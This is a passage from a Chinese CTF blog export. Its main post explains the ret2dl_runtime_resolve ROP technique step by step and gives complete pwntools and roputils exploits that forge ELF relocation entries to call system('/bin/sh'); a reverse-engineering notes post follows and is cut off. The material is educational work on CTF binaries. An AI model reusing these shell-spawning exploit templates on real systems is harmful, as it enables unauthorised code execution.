payload2#############\\n\" io.send(payload) io.send(\"/bin/sh\\x00\") io.interactive()","categories":[],"tags":[]},{"title":"高级ROP-ret2dl_runtime之通杀详解","slug":"╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ","date":"2019-09-14T16:17:05.000Z","updated":"2019-09-15T07:17:32.000Z","comments":true,"path":"2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/","link":"","permalink":"http://yoursite.com/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/","excerpt":"","text":"前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了 ret2dllruntime 原理先推荐几个地址学习下 ctf-wiki之高级ROP ctf-wiki之elf文件基本结构 虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(); vuln(); return 0;&#125;ssize_t vuln()&#123; char buf; // [esp+0h] [ebp-28h] return read(0, &amp;buf, 0x100u);&#125; 很明显的栈溢出可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：没有leak，如何做呢，ctf-wiki高级ROP了解一波 原理要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。 我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下 123456控制程序执行 dl_resolve 函数 给定 Link_map 以及 index 两个参数。 当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。 此外，这个攻击成功的很必要的条件 12dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。 注意： 1234符号版本信息 最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。重定位表项 r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。 相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)这里先说下动态延迟绑定机制：就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处先看下调试部分吧 1234567891011121314► 0x8048390 &lt;read@plt&gt; jmp dword ptr [read@got.plt] &lt;0x804a00c&gt; 0x8048396 &lt;read@plt+6&gt; push 0 0x804839b &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fe96c0&gt; ↓ 0xf7fe96c0 &lt;_dl_runtime_resolve&gt; push eax 0xf7fe96c1 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fe96c2 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fe96c3 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fe96c7 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fe96cb &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe3ac0&gt; 这是我在read@plt处下断， 你看他第一次调用的时候，read@got.plt里存的是下一条指令的地址，也就是0x8048396， 然后将read函数在表里的偏移push进去，这里push的是0， 然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read@got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数 而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。 elf部分的关键点（来自ctf-wiki)动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。 当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。 如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。 这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。 那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。 因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。 在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。 当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。 过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。 在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用 _dl_runtime_resolve(link_map_obj, reloc_index) 这里以 32 位为例（64 位类似），具体的过程如下 根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index 根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8 继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)] 判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 ) if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) if (sym-&gt;st_other) &amp; 3 == 0 ) 判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。 得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。 uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] r_found_version *version = &amp;l-&gt;l_version[ndx] 根据 name 来寻找相应函数在库中的地址。 name = STRTAB + sym-&gt;st_name 解析刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了简单来说，ret2dllruntime这个攻击方式他要利用三个表: .rel.plt .dynsym .dynstr 他先从.rel.plt表里找到某个函数在dynsym里的偏移 然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移 在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的贴张图，这是整体结构部分图 第一个表是.rel.plt也就是ELF REL Relocation Table这个表里有个结构体，存储了写入位置和具体偏移量 1234567891011LOAD:0804831C ; ELF REL Relocation TableLOAD:0804831C Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__LOAD:08048324 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderrLOAD:0804832C Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdinLOAD:08048334 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdoutLOAD:0804833C ; ELF JMPREL Relocation TableLOAD:0804833C Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT readLOAD:08048344 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarmLOAD:0804834C Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_mainLOAD:08048354 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbufLOAD:08048354 LOAD ends 前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07 1234typedef struct&#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125;Elf32_Rel; 他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找 第二个表是.dynsym也就是ELF Symbol Table12345678910111213141516LOAD:080481DC ; ELF Symbol TableLOAD:080481DC Elf32_Sym &lt;0&gt;LOAD:080481EC Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;LOAD:080481FC Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;LOAD:0804820C Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;LOAD:0804821C Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \\ ; &quot;__libc_start_main&quot;LOAD:0804821C 0&gt;LOAD:0804822C Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;LOAD:0804823C Elf32_Sym &lt;offset aStdout - offset byte_804827C, \\ ; &quot;stdout&quot;LOAD:0804823C offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;LOAD:0804824C Elf32_Sym &lt;offset aStderr - offset byte_804827C, \\ ; &quot;stderr&quot;LOAD:0804824C offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;LOAD:0804825C Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \\ ; &quot;_IO_stdin_used&quot;LOAD:0804825C offset _IO_stdin_used, 4, 11h, 0, 10h&gt;LOAD:0804826C Elf32_Sym &lt;offset aStdin - offset byte_804827C, \\ ; &quot;stdin&quot;LOAD:0804826C offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt; 在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体 123456789typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0 我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的 第三个表就是.dynstr了，也就是ELF String Table1234567891011121314151617LOAD:0804827C ; ELF String TableLOAD:0804827C byte_804827C db 0 ; DATA XREF: LOAD:080481EC↑oLOAD:0804827C ; LOAD:080481FC↑o ...LOAD:0804827D aLibcSo6 db &apos;libc.so.6&apos;,0LOAD:08048287 aIoStdinUsed db &apos;_IO_stdin_used&apos;,0 ; DATA XREF: LOAD:0804825C↑oLOAD:08048296 aStdin db &apos;stdin&apos;,0 ; DATA XREF: LOAD:0804826C↑oLOAD:0804829C aRead db &apos;read&apos;,0 ; DATA XREF: LOAD:080481EC↑oLOAD:080482A1 aStdout db &apos;stdout&apos;,0 ; DATA XREF: LOAD:0804823C↑oLOAD:080482A8 aStderr db &apos;stderr&apos;,0 ; DATA XREF: LOAD:0804824C↑oLOAD:080482AF aAlarm db &apos;alarm&apos;,0 ; DATA XREF: LOAD:080481FC↑oLOAD:080482B5 aSetvbuf db &apos;setvbuf&apos;,0 ; DATA XREF: LOAD:0804822C↑oLOAD:080482BD aLibcStartMain db &apos;__libc_start_main&apos;,0LOAD:080482BD ; DATA XREF: LOAD:0804821C↑oLOAD:080482CF aGmonStart db &apos;__gmon_start__&apos;,0 ; DATA XREF: LOAD:0804820C↑oLOAD:080482DE aGlibc20 db &apos;GLIBC_2.0&apos;,0LOAD:080482E8 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0LOAD:0804830C dd 0D696910h, 20000h, 62h, 0 这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的 exp详解我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程 123456789101112131415#!/usr/bin/env python# coding=utf-8from pwn import *offset = 44elf = ELF(&apos;./pwn&apos;)io = process(&apos;./pwn&apos;)rop = ROP(&apos;./pwn&apos;)bss_addr = elf.bss()stack_size = 0x800base_stage = bss_addr + stack_sizerop.raw(&apos;a&apos;*offset)rop.read(0, base_stage, 100)rop.migrate(base_stage)#gdb.attach(io)io.sendline(rop.chain()) 这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下 1234plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr 这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr 123456789101112typedef struct &#123; ELF32_Word sh_name; ELF32_Word sh_type; ELF32_Word sh_flags; ELF32_Addr sh_addr; ELF32_Off sh_offset; ELF32_Word sh_size; ELF32_Word sh_link; ELF32_Word sh_info; ELF32_Word sh_addralign; ELF32_Word sh_entsize;&#125; Elf32_Shdr; 成员 说明 sh_name 节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。 sh_type 根据节的内容和语义进行分类，具体的类型下面会介绍。 sh_flags 每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。 sh_addr 如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。 sh_offset 给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset 成员给出的是概念性的偏移。 sh_size 此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。 sh_link 此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。 sh_info 此成员给出附加信息，其解释依赖于节区类型。 sh_addralign 某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。 sh_entsize 某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。 sh_addr就是取这个地址，取进程镜像中的地址 接下来是重点了 如果这部分不理解，你就。。。 其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解 不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造 第一部分1234fake_sym_addr = base_stage + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += align#对齐 接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：假设内存布局是这样的 0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置0x8048a10 11111111 22222222 33333333 444444440x8048a20 11111111 22222222 33333333 444444440x8048a30 11111111 22222222 33333333 444444440x8048a40 11111111 22222222 33333333 444444440x8048a50 11111111 22222222 33333333 444444440x8048a60 11111111 22222222 33333333 444444440x8048a70 11111111 22222222 33333333 444444440x8048a80 11111111 22222222 33333333 44444444 我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址 假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88 利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8 故我的地址在加上align后就变成0x8048a90刚好是对齐了 第二部分12345index_dynsym = (fake_sym_addr - dynsym)/0x10r_info = index_dynsym &lt;&lt; 8 | 0x7read_got = elf.got[&apos;setvbuf&apos;]fake_sys_rel = flat([read_got, r_info])#构造.rel.plt表 然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移， 先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移 然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7 然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体 flat([])就是将里面的全变成字符 第三部分12st_name = fake_sym_addr + 0x10 - dynstrfake_sys = flat([st_name, 0, 0, 0x12]) 构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数 这里我将fake_sym_addr + 0x10作为’system\\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体 第四部分1index_offset = base_stage + 24 - rel_plt 这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的构造完后，我们需要构造ROP链了 ROP链的构造说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看 第一部分12rop = ROP(&apos;./pwn&apos;)sh = &apos;/bin/sh&apos; 初始化ROP链和参数 #### 第二部分 12rop.raw(plt0)rop.raw(index_offset) 先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve 然后传入偏移,32位是用栈传参的，也就是这样 如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0 第三部分12rop.raw(&apos;bbbb&apos;)rop.raw(base_stage+82) bbbb为返回地址 base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数 这里具体为什么是这里，你可以从gdb调试看出来，他里面 1234567891011121314gdb-peda$ disassemble _dl_runtime_resolveDump of assembler code for function _dl_runtime_resolve:=&gt; 0xf7f7e6c0 &lt;+0&gt;: push eax 0xf7f7e6c1 &lt;+1&gt;: push ecx 0xf7f7e6c2 &lt;+2&gt;: push edx 0xf7f7e6c3 &lt;+3&gt;: mov edx,DWORD PTR [esp+0x10] 0xf7f7e6c7 &lt;+7&gt;: mov eax,DWORD PTR [esp+0xc] 0xf7f7e6cb &lt;+11&gt;: call 0xf7f78ac0 &lt;_dl_fixup&gt; 0xf7f7e6d0 &lt;+16&gt;: pop edx 0xf7f7e6d1 &lt;+17&gt;: mov ecx,DWORD PTR [esp] 0xf7f7e6d4 &lt;+20&gt;: mov DWORD PTR [esp],eax 0xf7f7e6d7 &lt;+23&gt;: mov eax,DWORD PTR [esp+0x4] 0xf7f7e6db &lt;+27&gt;: ret 0xcEnd of assembler dump. 从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了看参数 这里arg[0]就是返回地址， arg[1]就是参数了 符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧 第四部分12rop.raw(&apos;bbbb&apos;)rop.raw(&apos;bbbb&apos;) 进行填充，使位置达到base_stage + 24 第五部分1rop.raw(fake_sys_rel) 填入.rel.plt里的一个结构体，用于解析函数 第六部分1rop.raw(align * &apos;a&apos;) 填充对齐部分 #### 第七部分 1rop.raw(fake_sys) 这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了 第八部分1rop.raw(&apos;system\\x00&apos;) 第九部分12rop.raw(&apos;a&apos;*(80 - len(rop.chain())))print len(rop.chain()) 这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh #### 第十部分 1234rop.raw(sh+&apos;\\x00&apos;)rop.raw(&apos;a&apos;*(100 - len(rop.chain())))io.sendline(rop.chain())io.interactive() 完整构造就这样完成了，接下来直接打就能成功了。先贴上完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python# coding=utf-8from pwn import *offset = 44elf = ELF(&apos;./pwn&apos;)io = process(&apos;./pwn&apos;)rop = ROP(&apos;./pwn&apos;)bss_addr = elf.bss()stack_size = 0x800base_stage = bss_addr + stack_sizerop.raw(&apos;a&apos;*offset)rop.read(0, base_stage, 100)rop.migrate(base_stage)#gdb.attach(io)io.sendline(rop.chain())rop = ROP(&apos;./pwn&apos;)plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrfake_sym_addr = base_stage + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym)/0x10st_name = fake_sym_addr + 0x10 - dynstrfake_sys = flat([st_name, 0, 0, 0x12])index_offset = base_stage + 24 - rel_pltread_got = elf.got[&apos;setvbuf&apos;]r_info = index_dynsym &lt;&lt; 8 | 0x7fake_sys_rel = flat([read_got, r_info])sh = &apos;/bin/sh&apos;rop.raw(plt0)rop.raw(index_offset)rop.raw(&apos;bbbb&apos;)rop.raw(base_stage+82)rop.raw(&apos;bbbb&apos;)rop.raw(&apos;bbbb&apos;)rop.raw(fake_sys_rel)rop.raw(align * &apos;a&apos;)rop.raw(fake_sys)rop.raw(&apos;system\\x00&apos;)rop.raw(&apos;a&apos;*(80 - len(rop.chain())))print len(rop.chain())rop.raw(sh+&apos;\\x00&apos;)rop.raw(&apos;a&apos;*(100 - len(rop.chain())))gdb.attach(io)io.sendline(rop.chain())io.interactive() 终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。 通杀 其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路 其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime 理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了 12345678910111213141516171819202122232425262728#!/usr/bin/env python# coding=utf-8from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextprocessName = &apos;pwn&apos;offset = 44r = process(&apos;./&apos; + processName)context.log_level = &apos;debug&apos;rop = ROP(&apos;./&apos; + processName)bss_base = rop.section(&apos;.bss&apos;)buf = rop.fill(offset)buf += rop.call(&apos;read&apos;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string(&apos;/bin/sh&apos;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)buf += rop.fill(100, buf)r.send(buf)r.interactive() 是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已 总结： 以后遇到高级ROP这种题就一把梭了 妈妈在也不用担心我遇到栈的这种问题了 我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了","categories":[],"tags":[]},{"title":"CG-CTF南邮RE逆向题笔记","slug":"CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟","date":"2019-09-14T16:15:59.000Z","updated":"2019-09-15T07:16:20.000Z","comments":true,"path":"2019/09/14/CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟/","link":"","permalink":"http://yoursite.com/2019/09/14/CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟/","excerpt":"","text":"1.Hello，RE！没什么好讲的，签到题，把获得的题目文件 1.exe 直接拖进IDA Pro即可 12345678910111213141516171819; int __cdecl main(int argc, const char **argv, const char **envp)public _main_main proc nearpush ebpmov ebp, espand esp, 0FFFFFFF0hsub esp, 90hcall ___mainmov dword ptr [esp], 410000h ; char *call __Z6printfPKcz ; printf(char const*,...)mov dword ptr [esp+75h], 67616C66hmov dword ptr [esp+79h], 6C65577Bhmov dword ptr [esp+7Dh], 656D6F63hmov dword ptr [esp+81h], 5F6F545Fhmov dword ptr [esp+85h], 575F4552hmov dword ptr [esp+89h], 646C726Fhmov word ptr [esp+8Dh], 7D21hmov byte ptr [esp+8Fh], 0jmp short loc_401592 有个 strcmp 函数，比较 v4 和 v5 地址的。选中 v5 ，发现倒序的 flag 字样。 按R即可获得Flag：flag{Welcome_To_RE_World!} 2.ReadAsm2单纯的汇编语言考察题目，题目有两段汇编代码 123456789int main(int argc, char const *argv[])&#123; char input[] = &#123;0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;; func(input, 28); printf(\"%s\\n\",input+1); return 0;&#125; 打开题目文件 2.asm 可获得第二段 func函数 汇编代码 123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 分析过程记录： （1）main() 部分0x 表示十六进制。flag 是对此 input 数组的操作组合而成。 http://www.bluesock.org/~willg/dev/ascii.html （2）函数调用部分4004e6：表示该指令对应的虚拟内存地址55：该指令对应的计算机指令 函数调用过程： 入栈，将寄存器的值压入调用 bp 栈中建立新栈帧，别掉函数栈帧栈底地址放入寄存器 实现 12push rbpmov rbp,rsp 寄存器类型： 1234ax(accumulator): 可用于存放函数返回值bp(base pointer): 用于存放执行中的函数对应的栈帧的栈底地址sp(stack poinger): 